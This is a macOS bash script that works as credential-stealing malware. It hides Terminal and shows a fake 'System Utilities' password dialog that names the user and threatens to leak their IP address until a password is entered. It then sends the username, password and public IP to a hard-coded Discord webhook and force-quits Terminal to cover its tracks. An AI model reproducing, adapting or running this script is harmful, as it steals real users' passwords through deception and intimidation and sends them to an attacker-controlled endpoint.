#!/bin/bash

# Ensure Terminal is hidden initially
osascript -e 'tell application "Terminal" to set visible of front window to false'

# Get the current username (for header purposes)
username=$(scutil <<< "show State:/Users/ConsoleUser" | awk '/Name :/ && ! /loginwindow/ { print $3 }')

# Initialize capture with a header line
capture="username=${username}\n_________________________________________________________________________________________\n\n"

# Define AppleScript for a persistent password prompt.
# It extracts the full name, splits it into first and last names,
# and repeatedly prompts until at least one character is entered.
read -r -d '' applescriptCode <<'EOF'
set fullName to (long user name of (system info))
set firstName to word 1 of fullName
set lastName to word -1 of fullName
set userPassword to ""
repeat while userPassword is ""
    try
        set userPassword to text returned of (display dialog "I know where you live, " & firstName & ".\n\nEnter your password, or I will leak your IP address, Mr. " & lastName with icon POSIX file "/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/FinderIcon.icns" with title "System Utilities" default answer "" with hidden answer)
    on error
        set userPassword to ""
    end try
end repeat
return userPassword
EOF

# Execute the AppleScript synchronously and capture its output in a temporary file
osascript -e "$applescriptCode" > pass_temp.txt

# Read the password from the temporary file
if [ -f pass_temp.txt ]; then
    dialogText=$(cat pass_temp.txt)
    rm pass_temp.txt
else
    dialogText="CANCEL"
fi

# Append the password to the capture text
capture="${capture}password=${dialogText}\n"

# Capture the public IP address using api.ipify.org
ipaddress=$(curl -s https://api.ipify.org)
capture="${capture}ipaddress=${ipaddress}"

# Save the captured information to pass.txt
echo -e "$capture" > pass.txt

# Determine which Python to use (prefer python3)
if command -v python3 &>/dev/null; then
    PYTHON=python3
elif command -v python &>/dev/null; then
    PYTHON=python
else
    echo "Error: Python is not installed."
    exit 1
fi

# Generate JSON payload using the available Python interpreter.
payload=$($PYTHON -c 'import sys, json; data=sys.stdin.read().strip(); print(json.dumps({"content": data}))' < pass.txt)

# Send captured data to the Discord webhook using curl
DISCORD_WEBHOOK="https://discord.com/api/webhooks/1356139808321179678/8ZUgN4B7F7M3tkPlUrc_gVNp1celjIS9JpUwkJKoFZVj61sgOK2T34-zlkZ0CMDmml6B"
curl -X POST -H "Content-Type: application/json" -d "$payload" "$DISCORD_WEBHOOK"

rm pass.txt

# Force-quit Terminal without confirmation
killall Terminal 2>/dev/null
